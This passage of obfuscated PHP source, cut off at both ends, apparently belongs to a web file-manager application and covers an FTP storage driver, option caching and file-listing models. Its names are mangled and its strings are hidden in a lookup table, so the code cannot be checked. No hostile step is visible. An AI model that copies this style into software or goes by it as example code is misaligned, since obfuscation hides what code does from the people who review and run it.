listAll($¿ğÓ½ÓÀ) { $–¡ãÖæ =& $_SERVER[—ÌÒğš÷]; if (!$this->_isconn()) { return !1; } $Úó¾ÅöÂ = $ëÁ¨°’Ù = array(); $this->fileList($¿ğÓ½ÓÀ, $Úó¾ÅöÂ, $ëÁ¨°’Ù, !0); $ôÊòïáŒ = array_to_keyvalue($ëÁ¨°’Ù, $–¡ãÖæ[32]); foreach ($Úó¾ÅöÂ as $ÚÉŞˆ¦) { if (is_string($ÚÉŞˆ¦)) { $ôÊòïáŒ[$ÚÉŞˆ¦] = array($–¡ãÖæ[76] => 0); } } return $this->listAllFiles($¿ğÓ½ÓÀ, $ôÊòïáŒ); } public function getContent($ôûËâ²‰) { if (!$this->_isconn()) { return !1; } $ôûËâ²‰ = $this->iconvSystem($ôûËâ²‰); return $this->fileSubstr($ôûËâ²‰); } public function setContent($×şäÏ»¨, $ÂéğÎ¯Æ = '') { if (!$this->_isconn()) { return !1; } $½©¦óö» = $this->pathThis($this->iconvSystem($×şäÏ»¨)); $ï»ö§´Ó = $this->tempFile($½©¦óö»); file_put_contents($ï»ö§´Ó, $ÂéğÎ¯Æ); $´ÔˆÖ® = $this->upload($×şäÏ»¨, $this->iconvApp($ï»ö§´Ó)); $this->tempFileRemve($ï»ö§´Ó); return $´ÔˆÖ®; } public function fileSubstr($¿±Şí±, $ÆŠ·¥ãÖ = 0, $„”ù°úŒ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¿±Şí±, $ÆŠ·¥ãÖ, $„”ù°úŒ); } private function ftpRequest($óù±‹ÅÈ, $üÓ¹“İ  = 0, $Œ¾‚ÅøØ = false) { $óù±‹ÅÈ = $this->iconvSystem($óù±‹ÅÈ); $ÃòÁ„á¨ = $this->scheme . $this->host . $_SERVER[—ÌÒğš÷][4] . $this->port; $ñ¢Šï¯ = curl_init(); curl_setopt($ñ¢Šï¯, CURLOPT_URL, $ÃòÁ„á¨ . $this->pathEncode($óù±‹ÅÈ)); curl_setopt($ñ¢Šï¯, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Œ¾‚ÅøØ) { $àæ®Ÿ¦° = $üÓ¹“İ  + $Œ¾‚ÅøØ - 1; curl_setopt($ñ¢Šï¯, CURLOPT_RANGE, "{$üÓ¹“İ }\55{$àæ®Ÿ¦°}"); } curl_setopt($ñ¢Šï¯, CURLOPT_RETURNTRANSFER, 1); $•ÑïÔÑç = curl_exec($ñ¢Šï¯); curl_close($ñ¢Šï¯); return $•ÑïÔÑç; } public function upload($¾ü©‚ è, $ÌÉ¶¶, $ñ¯ä•Îù = false, $âø–”Ùû = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¾ü©‚ è))) { return !1; } $¾ü©‚ è = $this->iconvSystem($¾ü©‚ è); $ÌÉ¶¶ = $this->iconvSystem($ÌÉ¶¶); $è—¥È™Ø = ftp_nb_put($this->connect, $¾ü©‚ è, $ÌÉ¶¶, FTP_BINARY); while ($è—¥È™Ø == FTP_MOREDATA) { $è—¥È™Ø = ftp_nb_continue($this->connect); } if ($è—¥È™Ø != FTP_FINISHED) { return !1; } return $this->getPathOuter($¾ü©‚ è); } public function download($õÁˆµ, $¹»ë•İ = '') { if (!$this->_isconn()) { return !1; } $À‚Ñğ¥® = $this->pathFather($¹»ë•İ); if (!IO::mkdir($À‚Ñğ¥®)) { return !1; } $õÁˆµ = $this->iconvSystem($õÁˆµ); $¹»ë•İ = $this->iconvSystem($¹»ë•İ); $óü¶Òä· = ftp_nb_get($this->connect, $¹»ë•İ, $õÁˆµ, FTP_BINARY); while ($óü¶Òä· == FTP_MOREDATA) { $óü¶Òä· = ftp_nb_continue($this->connect); } if ($óü¶Òä· != FTP_FINISHED) { return !1; } return $this->iconvApp($¹»ë•İ); } public function exist($ºÂÂÒÊ) { return $this->isFile($ºÂÂÒÊ) || $this->isFolder($ºÂÂÒÊ); } public function isFile($ºòÍö¾) { return !$this->isFolder($ºòÍö¾) && $this->objectMeta($ºòÍö¾); } public function isFolder($­ò²ÎÈ°) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][166], $­ò²ÎÈ°); } protected function objectMeta($ÉùÈãÛ¦) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][168], $ÉùÈãÛ¦); } protected function _objectMeta($Òâ¡ø›) { $¤›¤½Èó =& $_SERVER[—ÌÒğš÷]; if ($Òâ¡ø› == $¤›¤½Èó[12] || $Òâ¡ø› == $¤›¤½Èó[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Òâ¡ø› = $this->iconvSystem($Òâ¡ø›); $ºİüàÁÂ = array($¤›¤½Èó[32] => $this->iconvApp($Òâ¡ø›), $¤›¤½Èó[33] => $¤›¤½Èó[214], $¤›¤½Èó[76] => 0); @ftp_chdir($this->connect, $¤›¤½Èó[8]); $Ë÷ØÅá = @ftp_size($this->connect, $Òâ¡ø›); if ($Ë÷ØÅá != -1) { $ºİüàÁÂ[$¤›¤½Èó[76]] = $Ë÷ØÅá; } else { $šğ¯’àÈ = @ftp_chdir($this->connect, $Òâ¡ø›); if (!$šğ¯’àÈ) { return !1; } $ºİüàÁÂ[$¤›¤½Èó[33]] = $¤›¤½Èó[75]; } return $ºİüàÁÂ; } protected function _isFolder($¼ü·ÀÆ) { $äÑÁ×‹û =& $_SERVER[—ÌÒğš÷]; if ($¼ü·ÀÆ == $äÑÁ×‹û[12] || $¼ü·ÀÆ == $äÑÁ×‹û[8]) { return !0; } $ÒÓ÷­ = $this->_objectMeta($¼ü·ÀÆ); return isset($ÒÓ÷­[$äÑÁ×‹û[33]]) && $ÒÓ÷­[$äÑÁ×‹û[33]] == $äÑÁ×‹û[75] ? !0 : !1; } } goto B¤…Ø™™ä©; EÉ÷Öòïˆ‹: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($›»õääŞ = false, $Ö·õûşœ = '', $‚«÷ÛÊ’ = false) { $Õ‚õí°À =& $_SERVER[—ÌÒğš÷]; $ß²³­±¾ = $this->cacheGet($Ö·õûşœ); $üÛ˜©ï = $this->optionDefault($Ö·õûşœ); $üÛ˜©ï = is_array($üÛ˜©ï) ? $üÛ˜©ï : array(); if (is_array($ß²³­±¾)) { $ß²³­±¾ = array_merge($üÛ˜©ï, $ß²³­±¾); return $›»õääŞ ? isset($ß²³­±¾[$›»õääŞ]) ? $ß²³­±¾[$›»õääŞ] : null : $ß²³­±¾; } $•¸Şåó˜ = $this->filterWhere(array($Õ‚õí°À[33] => $Ö·õûşœ)); $ß²³­±¾ = $this->where($•¸Şåó˜)->select(); $ß²³­±¾ = array_to_keyvalue($ß²³­±¾, $Õ‚õí°À[94], $Õ‚õí°À[418]); foreach ($ß²³­±¾ as $„Ê¨÷›‹ => $¶¡Õ¨ì) { if ($‚«÷ÛÊ’ || in_array($„Ê¨÷›‹, $this->jsonField)) { $ß²³­±¾[$„Ê¨÷›‹] = json_decode($¶¡Õ¨ì, !0); } } $this->cacheSet($Ö·õûşœ, $ß²³­±¾); $ß²³­±¾ = array_merge($üÛ˜©ï, $ß²³­±¾); return $›»õääŞ ? $ß²³­±¾[$›»õääŞ] : $ß²³­±¾; } public function set($Ëùö¡½Ô, $î¢¯ğç = false, $ú´²’ò´ = '') { $—Æí»½ =& $_SERVER[—ÌÒğš÷]; $this->cacheRemove($ú´²’ò´); $ñ¯½ı–Ó = array(); $âÓÖà‚× = is_array($Ëùö¡½Ô) ? $Ëùö¡½Ô : array($Ëùö¡½Ô => $î¢¯ğç); foreach ($âÓÖà‚× as $î¡úŸåï => $¦º—ë¸…) { if (is_array($¦º—ë¸…)) { $¦º—ë¸… = json_encode_force($¦º—ë¸…); } $this->checkLength($¦º—ë¸…, !1, $this->tableName . $—Æí»½[4] . $Ëùö¡½Ô); $¦º—ë¸… = self::textEncode($¦º—ë¸…); $âÓÖà‚× = array($—Æí»½[33] => $ú´²’ò´, $—Æí»½[94] => $î¡úŸåï, $—Æí»½[418] => $¦º—ë¸…); $ñ¯½ı–Ó[] = $this->filterWhere($âÓÖà‚×); } if (!$ñ¯½ı–Ó) { return !0; } $á¨Ş¾Å = $this->cacheKey($—Æí»½[444]); CacheLock::lock($á¨Ş¾Å); $ —«§ö = $this->addAll($ñ¯½ı–Ó, array(), !0); CacheLock::unlock($á¨Ş¾Å); return $ —«§ö; } protected function optionDefault($ĞŠ×íÇµ = '') { return !1; } public function setDeep($›§™ş³ , $Á«­Í ü = false, $ÁÄ¬ğÔ‘ = '') { $èù§³É¯ = explode($_SERVER[—ÌÒğš÷][10], $›§™ş³ ); $Íà“ç¹Ö = $this->get(); array_set_value($Íà“ç¹Ö, $›§™ş³ , $Á«­Í ü); $this->set($èù§³É¯[0], $Íà“ç¹Ö[$èù§³É¯[0]], $ÁÄ¬ğÔ‘); } public function remove($Ÿ—Ö‡ˆ, $æŞ§³Çª = '') { $ÜœÆÉ×í =& $_SERVER[—ÌÒğš÷]; $this->cacheRemove($æŞ§³Çª); $¦¡£İ® = $this->filterWhere(array($ÜœÆÉ×í[94] => $Ÿ—Ö‡ˆ, $ÜœÆÉ×í[33] => $æŞ§³Çª)); if (is_null($Ÿ—Ö‡ˆ)) { unset($¦¡£İ®[$ÜœÆÉ×í[94]]); } return $this->where($¦¡£İ®)->delete(); } public function cacheSet($º„£¯ÏÆ, $ÔãÂ½ãÅ = false) { return Cache::set($this->cacheKey($º„£¯ÏÆ), $ÔãÂ½ãÅ); } public function cacheGet($¸ÑÛĞòò) { return Cache::get($this->cacheKey($¸ÑÛĞòò)); } public function cacheRemove($¯Öµ¿£ñ) { return Cache::remove($this->cacheKey($¯Öµ¿£ñ)); } protected function filterWhere($‘á‡) { return $‘á‡; } protected function cacheKey($Ö ¬ûÂÆ) { return $Ö ¬ûÂÆ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\143\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\x6d\x65" => "\151\x6f\x5f\163\x6f\165\x72\143\x65\x5f\x6d\x65\x74\141", "\x6d\x65\x74\141\x46\151\x65\154\144" => "\x73\x6f\x75\162\x63\145\x49\x44"); protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\151\155\x65", "\164\151\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\151\x6f\x6e"), array("\x63\x72\x65\x61\x74\x65\124\151\155\x65", "\164\151\155\145", "\151\156\x73\x65\x72\164", "\146\165\156\143\164\x69\x6f\x6e"), array("\x76\x69\145\167\124\x69\155\145", "\x74\151\x6d\145", "\151\x6e\163\x65\x72\164", "\146\165\x6e\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Œ°ú×£) { return $this->listSource(array($_SERVER[—ÌÒğš÷][445] => $Œ°ú×£)); } public function typeName($ùÚÁƒ‹É) { static $Ò»•ØºÑ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\x6d", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\162\157\x75\160"); return $Ò»•ØºÑ[$ùÚÁƒ‹É . $_SERVER[—ÌÒğš÷][12]]; } public function sourceListInfo($«Ş€”», $¼³“»±› = false) { $šŠÛºÙá =& $_SERVER[—ÌÒğš÷]; $«Ş€”» = $«Ş€”» ? $«Ş€”» : array(); $«Ş€”» = array_filter(array_unique($«Ş€”»)); if (!$«Ş€”») { return array(); } $©¹®™« = $this->where(array($šŠÛºÙá[181] => array($šŠÛºÙá[7], $«Ş€”»)))->select(); $this->_listDataApply($©¹®™«, $¼³“»±›); return array_to_keyvalue($©¹®™«, $šŠÛºÙá[181]); } public function pathInfoFilter(&$±³¦¾Ôô) { $ì´ª®ú =& $_SERVER[—ÌÒğš÷]; static $ù§²ö“ü = false; static $¢–Æ†Ò… = false; static $ó×£¤Ä‰ = false; if (!$ù§²ö“ü) { $ƒ¹”íë½ = $ì´ª®ú[446]; $ƒ¹”íë½ .= $ì´ª®ú[447]; $ƒ¹”íë½ .= $ì´ª®ú[448]; $‡ØÒîÔñ = $ì´ª®ú[449]; $¤÷ğ ¤ = explode($ì´ª®ú[50], $‡ØÒîÔñ); $ù§²ö“ü = explode($ì´ª®ú[50], $ƒ¹”íë½); $¢–Æ†Ò… = array(); foreach ($ù§²ö“ü as $…é‡¨ºŠ) { if (in_array($…é‡¨ºŠ, $¤÷ğ ¤)) { continue; } $¢–Æ†Ò…[] = $…é‡¨ºŠ; } $ó×£¤Ä‰ = explode($ì´ª®ú[50], $ì´ª®ú[450]); } foreach ($ó×£¤Ä‰ as $¯ô‘ÇŒ) { if (isset($±³¦¾Ôô[$¯ô‘ÇŒ])) { $±³¦¾Ôô[$¯ô‘ÇŒ] = intval($±³¦¾Ôô[$¯ô‘ÇŒ]); } } $±³¦¾Ôô[$ì´ª®ú[84]] = $ì´ª®ú[451] . $±³¦¾Ôô[$ì´ª®ú[181]] . $ì´ª®ú[452]; $±³¦¾Ôô[$ì´ª®ú[33]] = $±³¦¾Ôô[$ì´ª®ú[453]] == 1 ? $ì´ª®ú[75] : $ì´ª®ú[214]; $±³¦¾Ôô[$ì´ª®ú[178]] = $this->typeName($±³¦¾Ôô[$ì´ª®ú[178]]); if ($±³¦¾Ôô[$ì´ª®ú[453]] != 1) { $±³¦¾Ôô[$ì´ª®ú[175]] = $±³¦¾Ôô[$ì´ª®ú[454]]; unset($±³¦¾Ôô[$ì´ª®ú[454]]); } $®¸Ä¿Ê‰ = $ù§²ö“ü; if (isset($±³¦¾Ôô[$ì´ª®ú[455]]) && $±³¦¾Ôô[$ì´ª®ú[455]][$ì´ª®ú[456]] == -1) { $®¸Ä¿Ê‰ = $¢–Æ†Ò…; } $±³¦¾Ôô = array_field_key($±³¦¾Ôô, $®¸Ä¿Ê‰); return $±³¦¾Ôô; } public function listUserFav() { $áÙî•ı =& $_SERVER[—ÌÒğš÷]; $…»ãâè‹ = Model($áÙî•ı[457])->listData(); $°ŒÏ±ñµ = array_filter_by_field($…»ãâè‹, $áÙî•ı[33], $áÙî•ı[458]); $°ŒÏ±ñµ = array_to_keyvalue($°ŒÏ±ñµ, $áÙî•ı[12], $áÙî•ı[84]); if ($°ŒÏ±ñµ) { $µ¦÷ƒæ = $this->listSource(array($áÙî•ı[459] => array($áÙî•ı[460], $°ŒÏ±ñµ))); } $µ¦÷ƒæ = array_to_keyvalue($µ¦÷ƒæ[$áÙî•ı[413]], $áÙî•ı[181]); foreach ($…»ãâè‹ as &$§ØÕ½’) { $§ØÕ½’ = array($áÙî•ı[461] => $§ØÕ½’[$áÙî•ı[443]], $áÙî•ı[462] => $§ØÕ½’[$áÙî•ı[32]], $áÙî•ı[463] => $§ØÕ½’[$áÙî•ı[84]], $áÙî•ı[464] => $§ØÕ½’[$áÙî•ı[33]], $áÙî•ı[465] => $§ØÕ½’[$áÙî•ı[215]], $áÙî•ı[466] => $§ØÕ½’[$áÙî•ı[85]]); if ($§ØÕ½’[$áÙî•ı[33]] == $áÙî•ı[458] && $µ¦÷ƒæ[$§ØÕ½’[$áÙî•ı[84]]]) { $§ØÕ½’[$áÙî•ı[87]] = $µ¦÷ƒæ[$§ØÕ½’[$áÙî•ı[84]]]; } } unset($§ØÕ½’); return $…»ãâè‹; } public function listUserTag($İêïà˜) { $ƒÕŒÉé =& $_SERVER[—ÌÒğš÷]; if ($İêïà˜ && !is_array($İêïà˜)) { $İêïà˜ = array($İêïà˜); } $‚‹ŒÆŠÛ = Model($ƒÕŒÉé[467])->listData(); $ÅÎ­Éùä = array(); $ªôşèÇş = array(); foreach ($‚‹ŒÆŠÛ as $ÓĞË¼¯µ) { $ìÃõ¾È• = $ÓĞË¼¯µ[$ƒÕŒÉé[84]]; if (!$ìÃõ¾È•) { continue; } if (!isset($ªôşèÇş[$ìÃõ¾È•])) { $ªôşèÇş[$ìÃõ¾È•] = array(); } $ªôşèÇş[$ìÃõ¾È•][] = $ÓĞË¼¯µ[$ƒÕŒÉé[468]]; $ÅÎ­Éùä[$ÓĞË¼¯µ[$ƒÕŒÉé[84]]] = $ÓĞË¼¯µ; } $³È–õ™ = array(); $ò¾Çİ­Ú = array(); $˜È¯¯Í = array(); foreach ($ªôşèÇş as $¿ç¢Ô¨È => $šÍÆƒ) { $‹ÀˆñÎß = !0; if (!$İêïà˜) { $³È–õ™[] = $¿ç¢Ô¨È; continue; } foreach ($İêïà˜ as $»ôÂ«‚Ü) { if (!in_array($»ôÂ«‚Ü, $šÍÆƒ)) { $‹ÀˆñÎß = !1; break; } } if (!$‹ÀˆñÎß) { continue; } if (!is_numeric($¿ç¢Ô¨È)) { $½×­Ë‡Ş = $ÅÎ­Éùä[$¿ç¢Ô¨È]; $¥Â¡ÎœÖ = array($ƒÕŒÉé[32] => $½×­Ë‡Ş[$ƒÕŒÉé[32]], $ƒÕŒÉé[84] => $½×­Ë‡Ş[$ƒÕŒÉé[84]], $ƒÕŒÉé[33] => $½×­Ë‡Ş[$ƒÕŒÉé[33]], $ƒÕŒÉé[87] => array($ƒÕŒÉé[469] => 1), $ƒÕŒÉé[216] => !0); if ($½×­Ë‡Ş[$ƒÕŒÉé[33]] == $ƒÕŒÉé[214]) { $˜È¯¯Í[] = $¥Â¡ÎœÖ; } if ($½×­Ë‡Ş[$ƒÕŒÉé[33]] == $ƒÕŒÉé[75]) { $ò¾Çİ­Ú[] = $¥Â¡ÎœÖ; } continue; } $³È–õ™[] = $¿ç¢Ô¨È; } if ($³È–õ™) { $Âù¶±ÂÄ = $this->listSource(array($ƒÕŒÉé[459] => array($ƒÕŒÉé[460], $³È–õ™))); } $Âù¶±ÂÄ = $Âù¶±ÂÄ ? $Âù¶±ÂÄ : array($ƒÕŒÉé[82] => array(), $ƒÕŒÉé[83] => array()); $Âù¶±ÂÄ[$ƒÕŒÉé[82]] = array_merge($Âù¶±ÂÄ[$ƒÕŒÉé[82]], $ò¾Çİ­Ú); $Âù¶±ÂÄ[$ƒÕŒÉé[83]] = array_merge($Âù¶±ÂÄ[$ƒÕŒÉé[83]], $˜È¯¯Í); if (isset($Âù¶±ÂÄ[$ƒÕŒÉé[410]]) && count($³È–õ™) == $Âù¶±ÂÄ[$ƒÕŒÉé[410]][$ƒÕŒÉé[411]]) { return $Âù¶±ÂÄ; } $¸èÚøÔ¦ = array(); $ãÒ©Â®ş = array_to_keyvalue($Âù¶±ÂÄ[$ƒÕŒÉé[82]], $ƒÕŒÉé[12], $ƒÕŒÉé[181]); $Ä†ŠÙœ¿ = array_to_keyvalue($Âù¶±ÂÄ[$ƒÕŒÉé[83]], $ƒÕŒÉé[12], $ƒÕŒÉé[181]); $š—úÊÄ = array_merge($Ä†ŠÙœ¿, $ãÒ©Â®ş); foreach ($³È–õ™ as $ìÃõ¾È•) { if (!in_array($ìÃõ¾È•, $š—úÊÄ)) { $¸èÚøÔ¦[] = $ìÃõ¾È•; } } if ($¸èÚøÔ¦) { Model($ƒÕŒÉé[470])->removeBySource($¸èÚøÔ¦); } return $Âù¶±ÂÄ; } public function listUserRecycle() { $µ¶Å£ § =& $_SERVER[—ÌÒğš÷]; $ü«ğ   = Model($µ¶Å£ §[471])->listData(); if (!$ü«ğ  ) { return array(); } $¿Ğ­Œ» = array($µ¶Å£ §[459] => array($µ¶Å£ §[460], $ü«ğ  ), $µ¶Å£ §[472] => 1); return $this->listSource($¿Ğ­Œ»); } public function listSource($ì·ÂÁİä, $×şœÃ– = 3000, $½ñ›ï¿Â = false) { $­š“¬»• =& $_SERVER[—ÌÒğš÷]; if (!isset($ì·ÂÁİä[$­š“¬»•[473]])) { $ì·ÂÁİä[$­š“¬»•[473]] = 0; } if (isset($ì·ÂÁİä[$­š“¬»•[180]]) && $ì·ÂÁİä[$­š“¬»•[180]] == $­š“¬»•[212]) { $ì·ÂÁİä[$­š“¬»•[454]] = array($­š“¬»•[375], $­š“¬»•[474]); } $½ÔÄóıŒ = $­š“¬»•[475]; $å»¯®å¯ = $this->field($½ÔÄóıŒ)->_makeOrder()->where($ì·ÂÁİä)->selectPage($×şœÃ–); $this->_listPageCheck($å»¯®å¯, $½ÔÄóıŒ, $ì·ÂÁİä); $this->_listDataApply($å»¯®å¯[$­š“¬»•[413]], $½ñ›ï¿Â); $this->_listMake($å»¯®å¯); return $å»¯®å¯; } private function _listPageCheck(&$à†Àáë¨, $¯ÚĞ£õ, $ÎË»Ì½ï) { $‰ŠŒ§²ó =& $_SERVER[—ÌÒğš÷]; if (!is_array($à†Àáë¨[$‰ŠŒ§²ó[410]])) { return; } $ƒ»ö  = $à†Àáë¨[$‰ŠŒ§²ó[410]]; if ($ƒ»ö [$‰ŠŒ§²ó[412]] <= 1) { return; } if ($ƒ»ö [$‰ŠŒ§²ó[411]] >= 100000) { return; } if (Model($‰ŠŒ§²ó[476])->get($‰ŠŒ§²ó[477]) != $‰ŠŒ§²ó[478]) { return; } $¯ÚĞ£õ = str_replace(array($‰ŠŒ§²ó[53], $‰ŠŒ§²ó[386], $‰ŠŒ§²ó[246]), $‰ŠŒ§²ó[12], $¯ÚĞ£õ); $¯ÚĞ£õ = $‰ŠŒ§²ó[479] . str_replace($‰ŠŒ§²ó[50], $‰ŠŒ§²ó[480], $¯ÚĞ£õ) . $‰ŠŒ§²ó[481]; $«¯ÀªÁ¬ = $‰ŠŒ§²ó[482]; $«¯ÀªÁ¬ = $«¯ÀªÁ¬ . $‰ŠŒ§²ó[483]; $¹÷ñ¯²´ = $ƒ»ö [$‰ŠŒ§²ó[407]] * ($ƒ»ö [$‰ŠŒ§²ó[397]] - 1) . $‰ŠŒ§²ó[50] . $ƒ»ö [$‰ŠŒ§²ó[407]]; $ŸÈ»Ÿ‚ = $this->_makeOrder(!0); $ë³İÈÜÍ = $‰ŠŒ§²ó[479] . str_replace($‰ŠŒ§²ó[50], $‰ŠŒ§²ó[480], $ŸÈ»Ÿ‚[0]); if (strpos($ë³İÈÜÍ, $‰ŠŒ§²ó[484])) { $ë³İÈÜÍ = str_replace($‰ŠŒ§²ó[484], $‰ŠŒ§²ó[485], $ë³İÈÜÍ); } else { $ë³İÈÜÍ .= $‰ŠŒ§²ó[486] . $ŸÈ»Ÿ‚[1]; } $è­½ºÔÈ = array(); foreach ($ÎË»Ì½ï as $æ¼ğ–ºã => $›©¤¢Ê) { $è­½ºÔÈ[$‰ŠŒ§²ó[479] . $æ¼ğ–ºã] = $›©¤¢Ê; } $this->alias($‰ŠŒ§²ó[487])->field($¯ÚĞ£õ)->limit($¹÷ñ¯²´)->order($ë³İÈÜÍ); $ì•¸€÷ = $this->join($«¯ÀªÁ¬)->where($è­½ºÔÈ)->select(); if ($ì•¸€÷) { $à†Àáë¨[$‰ŠŒ§²ó[413]] = $ì•¸€÷; } } protected function _makeOrder($èÉ‹Ü© = false) { $ç¿¯Óª =& $_SERVER[—ÌÒğš÷]; $ôÖı—è = Model($ç¿¯Óª[488])->get($ç¿¯Óª[489]); $ı§Î‰ = Model($ç¿¯Óª[488])->get($ç¿¯Óª[490]); $¡¤ç‚® = array($ç¿¯Óª[491] => $ç¿¯Óª[492], $ç¿¯Óª[493] => $ç¿¯Óª[494]); $ıìáşû = array($ç¿¯Óª[32] => $ç¿¯Óª[32], $ç¿¯Óª[76] => $ç¿¯Óª[76], $ç¿¯Óª[175] => $ç¿¯Óª[454], $ç¿¯Óª[495] => $ç¿¯Óª[495], $ç¿¯Óª[496] => $ç¿¯Óª[497], $ç¿¯Óª[215] => $ç¿¯Óª[215], $ç¿¯Óª[85] => $ç¿¯Óª[85]); $ÌÙ”–ã = Input::get($ç¿¯Óª[498], $ç¿¯Óª[7], $ôÖı—è, array_keys($ıìáşû)); $òãüâô = Input::get($ç¿¯Óª[499], $ç¿¯Óª[7], $ı§Î‰, array_keys($¡¤ç‚®)); if (!in_array($ÌÙ”–ã, array_keys($ıìáşû))) { $ÌÙ”–ã = $ç¿¯Óª[32]; } if (!in_array($òãüâô, array_keys($¡¤ç‚®))) { $ÌÙ”–ã = $ç¿¯Óª[491]; } if ($ÌÙ”–ã == $ç¿¯Óª[32]) { } $Ş…õ«¡· = $ç¿¯Óª[500] . $ıìáşû[$ÌÙ”–ã] . $ç¿¯Óª[53] . $¡¤ç‚®[$òãüâô]; $Ş…õ«¡· = rtrim(trim($Ş…õ«¡·), $ç¿¯Óª[50]); if ($èÉ‹Ü©) { return array($Ş…õ«¡·, $¡¤ç‚®[$òãüâô]); } return $this->order($Ş…õ«¡·); } protected function _listDataApplyItem($êÊ Ì‡ı, $¦‡à›Õô = false) { $íÌ‰Úì„ = array($êÊ Ì‡ı); $this->_listDataApply($íÌ‰Úì„, $¦‡à›Õô); return $íÌ‰Úì„[0]; } protected function _listDataApply(&$ÜõŞöòù, $ÎòÇ´ñß = false) { $‡ä°ïĞÑ =& $_SERVER[—ÌÒğš÷]; if (!$ÜõŞöòù) { $ÜõŞöòù = array(); return; } $ñ€©óäÀ = array_to_keyvalue($ÜõŞöòù, $‡ä°ïĞÑ[12], $‡ä°ïĞÑ[181]); $ñ€©óäÀ = array_unique($ñ€©óäÀ); $this->_listSourceCache($ÜõŞöòù); if (!$ÎòÇ´ñß) { $this->_listAppendMeta($ÜõŞöòù, $ñ€©óäÀ); $this->_listAppendFileMeta($ÜõŞöòù, $ñ€©óäÀ); $this->_listAppendChildren($ÜõŞöòù, $ñ€©óäÀ); } $this->_listAppendPath($ÜõŞöòù); $this->_listAppendAuth($ÜõŞöòù); $this->_listAppendSourceInfo($ÜõŞöòù, $ñ€©óäÀ); $this->_listAppendUser($ÜõŞöòù); $this->_listFilterInfo($ÜõŞöòù, $ÎòÇ´ñß); $this->_listAppendAuthSecret($ÜõŞöòù); } protected function _listSourceCache($éŸ¢•äğ) { $¬ä÷‚Ñë =& $_SERVER[—ÌÒğš÷]; foreach ($éŸ¢•äğ as $ÓíÅ§Ÿ¼) { self::$cacheSourceInfo[$¬ä÷‚Ñë[501] . $ÓíÅ§Ÿ¼[$¬ä÷‚Ñë[181]]] = $ÓíÅ§Ÿ¼; } } protected function _listFilterInfo(&$‰ÈñÜ­®, $Óáİóê = false) { $ô¿˜ßñ½ =& $_SERVER[—ÌÒğš÷]; foreach ($‰ÈñÜ­® as &$ŒÌÁÃ€õ) { $ŒÌÁÃ€õ = $this->pathInfoFilter($ŒÌÁÃ€õ); self::$cachePathInfo[$ô¿˜ßñ½[502] . intval($Óáİóê) . $ô¿˜ßñ½[430] . $ŒÌÁÃ€õ[$ô¿˜ßñ½[181]]] = $ŒÌÁÃ€õ; } unset($ŒÌÁÃ€õ); } protected function _listMake(&$œïò„¼‚) { $œ’ûÑ¯é =& $_SERVER[—ÌÒğš÷]; $œïò„¼‚[$œ’ûÑ¯é[82]] = array(); $œïò„¼‚[$œ’ûÑ¯é[83]] = array(); foreach ($œïò„¼‚[$œ’ûÑ¯é[413]] as $Ğ‡óçñ¿) { $©çªä×ó = $Ğ‡óçñ¿[$œ’ûÑ¯é[453]] == 1 ? $œ’ûÑ¯é[82] : $œ’ûÑ¯é[83]; $œïò„¼‚[$©çªä×ó][] = $Ğ‡óçñ¿; } unset($œïò„¼‚[$œ’ûÑ¯é[413]]); } protected function _listAppendMeta(&$ş£å”¨•, $™™éóâÕ) { $¦É‡¼úî =& $_SERVER[—ÌÒğš÷]; $§“æ…® = array($¦É‡¼úî[459] => array($¦É‡¼úî[460], $™™éóâÕ)); $ÑÖö‘è = Model($¦É‡¼úî[503])->field($¦É‡¼úî[504])->where($§“æ…®)->select(); if (!$ÑÖö‘è) { return; } $ú­ò¢ã = array($¦É‡¼úî[505], $¦É‡¼úî[506], $¦É‡¼úî[485]); $–½üÌÄ = array(); foreach ($ÑÖö‘è as $ìış×»¡) { if (!isset($–½üÌÄ[$ìış×»¡[$¦É‡¼úî[181]]])) { $–½üÌÄ[$ìış×»¡[$¦É‡¼úî[181]]] = array(); } if (in_array($ìış×»¡[$¦É‡¼úî[94]], $ú­ò¢ã)) { continue; } $–½üÌÄ[$ìış×»¡[$¦É‡¼úî[181]]][$ìış×»¡[$¦É‡¼úî[94]]] = $ìış×»¡[$¦É‡¼úî[418]]; } foreach ($ş£å”¨• as &$ÑÖüêØ) { $ÑÖüêØ[$¦É‡¼úî[507]] = !1; if (isset($–½üÌÄ[$ÑÖüêØ[$¦É‡¼úî[181]]])) { $ÑÖüêØ[$¦É‡¼úî[507]] = $–½üÌÄ[$ÑÖüêØ[$¦É‡¼úî[181]]]; } if ($this->fileIsLock($ÑÖüêØ) && $ÑÖüêØ[$¦É‡¼úî[455]]) { $üäç“Î = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÑÖüêØ[$¦É‡¼úî[455]][$¦É‡¼úî[456]] = AuthModel::authDisable($ÑÖüêØ[$¦É‡¼úî[455]][$¦É‡¼úî[456]], $üäç“Î); $ÑÖüêØ[$¦É‡¼úî[455]][$¦É‡¼úî[508]][$¦É‡¼úî[455]] = $ÑÖüêØ[$¦É‡¼úî[455]][$¦É‡¼úî[456]]; } } unset($ÑÖüêØ); } protected function _listAppendFileMeta(&$±ê¡¢Œç, $×„«ø•À) { $Ğ¦¸îÌÎ =& $_SERVER[—ÌÒğš÷]; $¶«‘ü™ = array_to_keyvalue($±ê¡¢Œç, $Ğ¦¸îÌÎ[12], $Ğ¦¸îÌÎ[509]); $¶«‘ü™ = array_filter(array_unique($¶«‘ü™)); if (!$¶«‘ü™) { return; } $ïØóÃÒô = array($Ğ¦¸îÌÎ[510] => array($Ğ¦¸îÌÎ[460], $¶«‘ü™)); $¼õ‹‡è– = 